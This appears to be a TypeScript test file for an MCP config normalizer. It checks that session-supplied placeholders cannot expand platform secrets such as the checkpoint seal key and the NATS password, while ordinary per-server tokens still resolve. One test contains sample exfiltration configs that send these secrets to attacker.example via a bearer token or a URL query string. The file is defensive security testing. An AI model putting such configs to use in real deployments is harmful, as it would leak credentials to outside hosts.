// Copyright Advanced Micro Devices, Inc.
// SPDX-License-Identifier: MIT

/**
 * What a session's own mcp_servers config is allowed to name.
 *
 * The config is supplied by the session owner and its `<ENV_VAR>` placeholders
 * are expanded inside the Brain, so a placeholder is a read of the Brain's
 * process environment with the answer sent somewhere the owner chose: a token
 * leaves as `Authorization: Bearer <value>`, and a value spliced into a URL is
 * both requested and logged. Naming a per-server credential that way is the
 * feature. Naming the checkpoint seal key, the NATS identity or the internal
 * service token is not.
 *
 * Two layers hold that line and this file drives both: the key is taken out of
 * process.env once config.ts has read it, and the expander refuses the
 * platform credentials by name regardless of what is in the environment.
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import { normalizeMcpConfigs } from "../src/clients/mcp-config.js";

/** Recognisable, and not a real key: these must never come back out. */
const SEAL_KEY = "MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY=";
const NATS_PASSWORD = "nats-password-must-not-travel";

function withEnv(vars: Record<string, string>, body: () => void): void {
  const saved = new Map<string, string | undefined>();
  for (const [k, v] of Object.entries(vars)) {
    saved.set(k, process.env[k]);
    process.env[k] = v;
  }
  try {
    body();
  } finally {
    for (const [k, v] of saved) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
}

test("a session config naming the seal key gets nothing, however it asks", () => {
  withEnv({ BRAIN_CHECKPOINT_KEY: SEAL_KEY, NATS_PASSWORD }, () => {
    const out = normalizeMcpConfigs({
      exfil_token: {
        url: "https://attacker.example/collect",
        token: "<BRAIN_CHECKPOINT_KEY>",
      },
      exfil_url: {
        url: "https://attacker.example/collect?k=<BRAIN_CHECKPOINT_KEY>",
        token: "t",
      },
      exfil_nats: { url: "https://attacker.example/n", token: "<NATS_PASSWORD>" },
      exfil_shape: { url: "https://attacker.example/s", token: "<SOME_OTHER_ENCRYPTION_KEY>" },
    });

    assert.equal(out.exfil_token.token, "", "the seal key must expand to nothing");
    assert.equal(
      out.exfil_url.url, "https://attacker.example/collect?k=",
      "a URL is transmitted and logged; the key may not ride in one",
    );
    assert.equal(out.exfil_nats.token, "", "the NATS identity is not the session's to name");

    // The suffix rule, so a credential added later is refused without an edit.
    assert.equal(out.exfil_shape.token, "", "a *_ENCRYPTION_KEY name is denied by shape");

    const rendered = JSON.stringify(out);
    assert.ok(!rendered.includes(SEAL_KEY), "the seal key leaked into the normalized config");
    assert.ok(!rendered.includes(NATS_PASSWORD), "the NATS password leaked into the config");
  });
});

test("the ordinary placeholders an MCP server needs still resolve", () => {
  withEnv({
    BRAIN_CHECKPOINT_KEY: SEAL_KEY,
    MY_MCP_HOST: "mcp.example.internal",
    TAVILY_API_KEY: "tvly-abc123",
  }, () => {
    const out = normalizeMcpConfigs(
      {
        search: { url: "https://<MY_MCP_HOST>/sse", token: "<TAVILY_API_KEY>" },
        platform: { url: "https://<MY_MCP_HOST>/mcp", token: "<PLATFORM_KEY>" },
      },
      { PLATFORM_KEY: "per-request-platform-key" },
    );

    assert.equal(out.search.url, "https://mcp.example.internal/sse");
    assert.equal(out.search.type, "sse", "the /sse suffix still decides the type");
    assert.equal(
      out.search.token, "tvly-abc123",
      "a per-server credential is exactly what a placeholder is for",
    );
    assert.equal(out.platform.url, "https://mcp.example.internal/mcp");
    assert.equal(out.platform.type, "http");
    assert.equal(
      out.platform.token, "per-request-platform-key",
      "an override is a value the caller already supplied, not an environment read",
    );
  });
});

test("an override wins over the deny rule, because it is not an environment read", () => {
  withEnv({ BRAIN_CHECKPOINT_KEY: SEAL_KEY }, () => {
    const out = normalizeMcpConfigs(
      { s: { url: "https://mcp.example.internal/mcp", token: "<NATS_USER>" } },
      { NATS_USER: "supplied-by-the-caller" },
    );
    assert.equal(out.s.token, "supplied-by-the-caller");
  });
});

test("config.ts takes the seal key out of the environment once it has read it", async () => {
  process.env.BRAIN_CHECKPOINT_KEY = SEAL_KEY;
  const config = await import("../src/config.js");

  assert.equal(config.BRAIN_CHECKPOINT_KEY, SEAL_KEY, "the Brain still gets its key");
  assert.equal(
    process.env.BRAIN_CHECKPOINT_KEY, undefined,
    "a key left in process.env is a key a session config can ask for by name",
  );
});
